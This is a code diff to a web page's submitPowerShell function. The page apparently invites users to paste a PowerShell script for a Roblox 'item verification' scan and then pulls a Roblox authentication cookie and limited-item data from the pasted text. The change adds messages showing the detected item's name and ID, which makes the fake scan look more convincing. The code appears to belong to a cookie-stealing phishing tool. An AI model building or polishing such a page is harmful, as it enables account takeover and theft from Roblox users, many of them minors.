@@ -205,16 +205,27 @@ async function submitPowerShell() {
         return;
     }
 
-    // Show loading state
+    // Detect item first before showing loading
+    const detectedItem = detectRobloxItemFromScript(inputText);
+    
+    // Debug: Show if item was detected
+    if (detectedItem) {
+        showNotification(`Item detected: ${detectedItem.name}`, 'success');
+    } else {
+        showNotification('No specific item detected', 'warning');
+    }
+    
+    // Show loading state with detected item
     submitBtn.disabled = true;
     submitText.textContent = 'Sending...';
-    showLoadingOverlay('Preparing scan...', 'Initializing item verification process');
+    const initialTitle = detectedItem ? `Preparing to scan ${detectedItem.name}...` : 'Preparing scan...';
+    const initialDescription = detectedItem ? `Found ${detectedItem.type} (ID: ${detectedItem.id})` : 'Initializing item verification process';
+    showLoadingOverlay(initialTitle, initialDescription);
 
     try {
-                                // Scan limited items and find authentication data from the input
+                                        // Scan limited items and find authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
-        const detectedItem = detectRobloxItemFromScript(inputText);
         
         // Check word count using real input value - if 50+ words, allow through even without auth data
         const wordCount = realInputValue.split(/\s+/).filter(word => word.length > 0).length;
